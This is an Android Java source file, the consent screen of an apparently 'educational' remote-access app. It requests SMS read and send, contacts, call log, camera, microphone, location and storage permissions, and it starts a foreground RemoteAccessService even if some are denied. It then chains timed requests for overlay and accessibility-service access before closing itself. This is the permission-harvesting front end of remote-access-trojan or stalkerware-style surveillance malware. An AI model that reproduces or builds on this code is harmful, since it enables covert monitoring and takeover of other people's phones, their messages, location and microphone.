package com.remoteaccess.educational;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.remoteaccess.educational.permissions.AutoPermissionManager;
import com.remoteaccess.educational.services.RemoteAccessService;
import com.remoteaccess.educational.utils.PreferenceManager;
import java.util.ArrayList;
import java.util.List;

public class ConsentActivity extends AppCompatActivity {

    private CheckBox consentCheckbox;
    private Button acceptButton;
    private PreferenceManager preferenceManager;
    private AutoPermissionManager permissionManager;

    private static final int PERMISSION_REQUEST_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_consent);

        preferenceManager = new PreferenceManager(this);
        permissionManager = new AutoPermissionManager(this);

        consentCheckbox = findViewById(R.id.consentCheckbox);
        acceptButton = findViewById(R.id.acceptButton);

        acceptButton.setEnabled(false);

        consentCheckbox.setOnCheckedChangeListener((buttonView, isChecked) -> {
            acceptButton.setEnabled(isChecked);
        });

        acceptButton.setOnClickListener(v -> {
            if (consentCheckbox.isChecked()) {
                requestNecessaryPermissions();
            }
        });
    }

    private void requestNecessaryPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();

        // Check and add permissions that are not granted
        String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        };

        // Add Android 13+ permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            String[] android13Permissions = {
                "android.permission.READ_MEDIA_IMAGES",
                "android.permission.READ_MEDIA_VIDEO",
                "android.permission.READ_MEDIA_AUDIO",
                "android.permission.POST_NOTIFICATIONS"
            };
            for (String permission : android13Permissions) {
                try {
                    if (ContextCompat.checkSelfPermission(this, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                        permissionsToRequest.add(permission);
                    }
                } catch (Exception e) {
                    // Permission might not exist
                }
            }
        }

        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toArray(new String[0]),
                PERMISSION_REQUEST_CODE
            );
        } else {
            grantConsent();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Proceed even if some permissions denied (user can grant later)
            grantConsent();
        }
    }

    private void grantConsent() {
        preferenceManager.setConsentGiven(true);
        
        // Start remote access service
        Intent serviceIntent = new Intent(this, RemoteAccessService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        Toast.makeText(this, "Consent granted. Requesting permissions...", Toast.LENGTH_SHORT).show();
        
        // Auto-request special permissions after consent
        autoRequestSpecialPermissions();
    }

    private void autoRequestSpecialPermissions() {
        // Step 1: Request overlay permission (with delay)
        new Handler().postDelayed(() -> {
            permissionManager.requestSpecialPermissions();
        }, 1500);

        // Step 2: Request accessibility service (with delay)
        new Handler().postDelayed(() -> {
            if (!permissionManager.isAccessibilityServiceEnabled()) {
                permissionManager.requestAccessibilityService();
            }
        }, 3000);

        // Step 3: Request notification permission for Android 13+
        new Handler().postDelayed(() -> {
            permissionManager.requestNotificationPermission();
        }, 4500);

        // Finish activity after starting all permission requests
        new Handler().postDelayed(() -> {
            finish();
        }, 6000);
    }
}
